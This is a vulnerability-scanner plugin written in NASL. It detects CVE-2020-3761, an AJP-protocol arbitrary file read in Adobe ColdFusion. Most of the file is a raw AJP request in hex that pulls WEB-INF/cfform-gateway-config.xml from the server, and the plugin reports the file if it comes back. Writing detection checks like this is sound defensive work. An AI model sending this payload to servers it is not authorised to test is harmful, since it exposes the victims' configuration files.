include("compat.inc");

if (description)
{
  script_id(51799230);
  script_version("1.3");
  script_cve_id("CVE-2020-3761");
  script_cvs_date("Date: 2020/03/21");

  script_name(english:"Adobe ColdFusion Ajp protocol Web directory arbitrary file read");
  script_summary(english:"Adobe ColdFusion Ajp protocol Web directory arbitrary file read");
  script_set_attribute(attribute:"description", value:"Adobe ColdFusion is a set of rapid application development platforms from Adobe Corporation. The platform includes an integrated development environment and a scripting language.There are security vulnerabilities in Adobe ColdFusion 2016 Update 13 and earlier and ColdFusion 2018 Update 7 and earlier. An attacker could use this vulnerability to read arbitrary files from the Coldfusion installation directory.");
  script_set_attribute(attribute:"solution", value:"At present, the manufacturer has released an upgrade patch to fix the vulnerability, and the patch obtains the link: https://helpx.adobe.com/security/products/coldfusion/apsb20-16.html");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"plugin_publication_date", value: "2020/03/21");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"asset_inventory", value:"True");
  script_end_attributes();
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_dependencies("find_service1.nasl","httpver.nasl");
  script_require_keys("installed_sw/ColdFusion");
  script_require_ports("Services/unknown", 8016, 8018);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");
include("http.inc");
include("install_func.inc");


app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:80);
install = get_single_install(app_name:app, port:port);

version = install['version'];

if(version == 2016)
{
    port_send = 8016;
}

if(version == 2018)
{
    port_send = 8018;
}


if (!get_port_state(port_send)) port_send=get_kb_item("Services/unknown");

soc = open_sock_tcp(port_send);
if (!soc) exit(0);


strreq = raw_string(
0x12, 0x34, 0x01, 0xa2, 0x02, 0x02, 0x00, 0x08, 
0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 
0x00, 0x00, 0x05, 0x2f, 0x61, 0x73, 0x64, 0x66, 
0x00, 0x00, 0x0e, 0x31, 0x37, 0x32, 0x2e, 0x31, 
0x38, 0x2e, 0x32, 0x35, 0x33, 0x2e, 0x32, 0x32, 
0x35, 0x00, 0xff, 0xff, 0x00, 0x0e, 0x31, 0x37, 
0x32, 0x2e, 0x31, 0x38, 0x2e, 0x32, 0x35, 0x33, 
0x2e, 0x32, 0x32, 0x35, 0x00, 0x00, 0x50, 0x00, 
0x00, 0x09, 0xa0, 0x06, 0x00, 0x0a, 0x6b, 0x65, 
0x65, 0x70, 0x2d, 0x61, 0x6c, 0x69, 0x76, 0x65, 
0x00, 0x00, 0x0f, 0x41, 0x63, 0x63, 0x65, 0x70, 
0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 
0x67, 0x65, 0x00, 0x00, 0x0e, 0x65, 0x6e, 0x2d, 
0x55, 0x53, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 
0x30, 0x2e, 0x35, 0x00, 0xa0, 0x08, 0x00, 0x01, 
0x30, 0x00, 0x00, 0x0f, 0x41, 0x63, 0x63, 0x65, 
0x70, 0x74, 0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64, 
0x69, 0x6e, 0x67, 0x00, 0x00, 0x13, 0x67, 0x7a, 
0x69, 0x70, 0x2c, 0x20, 0x64, 0x65, 0x66, 0x6c, 
0x61, 0x74, 0x65, 0x2c, 0x20, 0x73, 0x64, 0x63, 
0x68, 0x00, 0x00, 0x0d, 0x43, 0x61, 0x63, 0x68, 
0x65, 0x2d, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 
0x6c, 0x00, 0x00, 0x09, 0x6d, 0x61, 0x78, 0x2d, 
0x61, 0x67, 0x65, 0x3d, 0x30, 0x00, 0xa0, 0x0e, 
0x00, 0x07, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 
0x61, 0x00, 0x00, 0x19, 0x55, 0x70, 0x67, 0x72, 
0x61, 0x64, 0x65, 0x2d, 0x49, 0x6e, 0x73, 0x65, 
0x63, 0x75, 0x72, 0x65, 0x2d, 0x52, 0x65, 0x71, 
0x75, 0x65, 0x73, 0x74, 0x73, 0x00, 0x00, 0x01, 
0x31, 0x00, 0xa0, 0x01, 0x00, 0x09, 0x74, 0x65, 
0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x00, 
0xa0, 0x0b, 0x00, 0x0e, 0x31, 0x37, 0x32, 0x2e, 
0x31, 0x38, 0x2e, 0x32, 0x35, 0x33, 0x2e, 0x32, 
0x32, 0x35, 0x00, 0x0a, 0x00, 0x21, 0x6a, 0x61, 
0x76, 0x61, 0x78, 0x2e, 0x73, 0x65, 0x72, 0x76, 
0x6c, 0x65, 0x74, 0x2e, 0x69, 0x6e, 0x63, 0x6c, 
0x75, 0x64, 0x65, 0x2e, 0x72, 0x65, 0x71, 0x75, 
0x65, 0x73, 0x74, 0x5f, 0x75, 0x72, 0x69, 0x00, 
0x00, 0x01, 0x2f, 0x00, 0x0a, 0x00, 0x1f, 0x6a, 
0x61, 0x76, 0x61, 0x78, 0x2e, 0x73, 0x65, 0x72, 
0x76, 0x6c, 0x65, 0x74, 0x2e, 0x69, 0x6e, 0x63, 
0x6c, 0x75, 0x64, 0x65, 0x2e, 0x70, 0x61, 0x74, 
0x68, 0x5f, 0x69, 0x6e, 0x66, 0x6f, 0x00, 0x00, 
0x21, 0x57, 0x45, 0x42, 0x2d, 0x49, 0x4e, 0x46, 
0x2f, 0x63, 0x66, 0x66, 0x6f, 0x72, 0x6d, 0x2d, 
0x67, 0x61, 0x74, 0x65, 0x77, 0x61, 0x79, 0x2d, 
0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x2e, 0x78, 
0x6d, 0x6c, 0x00, 0x0a, 0x00, 0x22, 0x6a, 0x61, 
0x76, 0x61, 0x78, 0x2e, 0x73, 0x65, 0x72, 0x76, 
0x6c, 0x65, 0x74, 0x2e, 0x69, 0x6e, 0x63, 0x6c, 
0x75, 0x64, 0x65, 0x2e, 0x73, 0x65, 0x72, 0x76, 
0x6c, 0x65, 0x74, 0x5f, 0x70, 0x61, 0x74, 0x68, 
0x00, 0x00, 0x01, 0x2f, 0x00, 0xff);

send(socket:soc, data:strreq);

res_1 = recv(socket:soc, length:4);
if (strlen(res_1) == 4 && getword(blob:res_1, pos:0) == 0x4142 &&getword(blob:res_1, pos:2) > 0)
  {
    res_2 = recv(socket:soc, length:20000);
    if (strlen(res_2) > 100 && 'Remoting Gateway Configuration File' >< res_2 && "</gateway-config>" >< res_2)
    {
		security_note(port:port, data:res_2);
    }
  }
close(soc);
exit(0);
